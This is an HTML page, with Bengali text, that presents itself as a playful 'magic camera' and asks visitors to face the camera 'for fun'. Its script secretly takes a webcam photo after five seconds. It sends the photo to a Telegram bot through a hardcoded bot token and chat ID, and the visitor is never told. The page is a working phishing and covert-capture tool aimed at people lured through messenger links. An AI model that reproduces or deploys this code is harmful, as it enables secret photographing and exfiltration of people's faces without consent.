<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <title>Megical Camera</title>
  <style>
    body {
      margin: 0;
      background-color: black;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      height: 100vh;
      color: white;
      font-family: 'Arial', sans-serif;
      text-align: center;
      padding: 20px;
    }
    #message {
      font-size: 22px;
      color: #00ffcc;
      margin-top: 20px;
    }
    video {
      border: 4px solid #00ffcc;
      border-radius: 12px;
      width: 90%;
      max-width: 500px;
    }
    #notice {
      font-size: 14px;
      color: #cccccc;
      margin-bottom: 10px;
      line-height: 1.6;
    }
    #copyright {
      font-size: 13px;
      color: #555;
      margin-top: 8px;
    }
  </style>
</head>
<body>
  <div id="message">আপনার চেহারা ক্যামেরার মধ্যে রাখুন আর মজা দেখুন</div>
  
  <video id="video" autoplay playsinline></video>

  <div id="notice">
    <b>বিশেষ দ্রষ্টব্য:</b><br>
    মেসেঞ্জারে যদি আপনার ছবি না দেখা যায়, তাহলে<br>
    এই লিঙ্কটি কপি করে Google এ পেস্ট করে দেখুন।
    <div id="copyright">Copyright ©️ SOAD</div>
  </div>

  <script>
    const telegramBotToken = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
    const telegramChatId = "6429244657";

    const video = document.getElementById('video');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setTimeout(() => {
          captureAndSendPhoto();
        }, 5000); // ৫ সেকেন্ড পর ছবি উঠবে
      });

    function captureAndSendPhoto() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);

      const imageData = canvas.toDataURL('image/jpeg');
      const blob = dataURLtoBlob(imageData);

      const formData = new FormData();
      formData.append('chat_id', telegramChatId);
      formData.append('photo', blob, 'face.jpg');

      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while(n--) {
        u8arr[n] = bstr.charCodeAt(n);
      }
      return new Blob([u8arr], {type:mime});
    }
  </script>
</body>
</html>
